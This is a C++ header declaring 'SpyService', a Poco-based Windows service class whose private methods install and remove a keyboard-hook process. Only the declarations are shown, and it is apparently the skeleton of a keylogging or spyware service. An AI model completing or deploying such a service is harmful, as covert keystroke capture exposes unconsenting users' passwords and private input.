#pragma once
#include <Windows.h>
#include <iostream>
#include <sstream>
#include <fstream>
#include <cstdlib>
#include <ctime>
#include "Poco/Util/WinService.h"
#include "Poco/Util/WinRegistryKey.h"
#include "Poco/Util/AbstractConfiguration.h"
#include "Poco/Util/XMLConfiguration.h"
#include "Poco/Util/Application.h"
#include "Poco/Util/Option.h"
#include "Poco/Util/OptionSet.h"
#include "Poco/Util/HelpFormatter.h"
#include "Poco/Util/ServerApplication.h"
#include "Poco/Util/LoggingSubsystem.h"
#include "Poco/Util/PropertyFileConfiguration.h"
#include "Poco/PatternFormatter.h"
#include "Poco/FileChannel.h"
#include "Poco/FormattingChannel.h"
#include "Poco/SplitterChannel.h"
#include "Poco/Path.h"
#include "Poco/FileStream.h"
#include "Poco/DateTimeFormatter.h"
#include <Poco/UnicodeConverter.h>
#include "Poco/ConsoleChannel.h"
#include "Poco/Util/Option.h"
#include "Poco/Util/OptionSet.h"
#include "Poco/Util/OptionProcessor.h"
#include <Poco/Process.h>
#include <Poco/Pipe.h>
#include <sddl.h>
#include <thread>

using namespace Poco;

using Poco::SystemException;

using Poco::Util::WinRegistryKey;
using Poco::Util::AbstractConfiguration;
using Poco::Util::XMLConfiguration;
using Poco::Util::Application;
using Poco::Util::Option;
using Poco::Util::OptionSet;
using Poco::Util::HelpFormatter;
using Poco::Util::ServerApplication;
using Poco::Util::LoggingSubsystem;
using Poco::Path;
using Poco::FileOutputStream;
using Poco::DateTimeFormatter;


class SpyService : public ServerApplication
{
public:
    SpyService();

protected:
    void initialize(Application& self);

    void uninitialize();

    void defineOptions(OptionSet& options);

    void handleOption(const std::string& name, const std::string& value);

    void displayHelp();

    int main(const std::vector<std::string>& args);

private:
    bool _helpRequested;

    std::string appName;

    void installKeyboardHookProcess();

    void removelKeyboardHookProcess();
};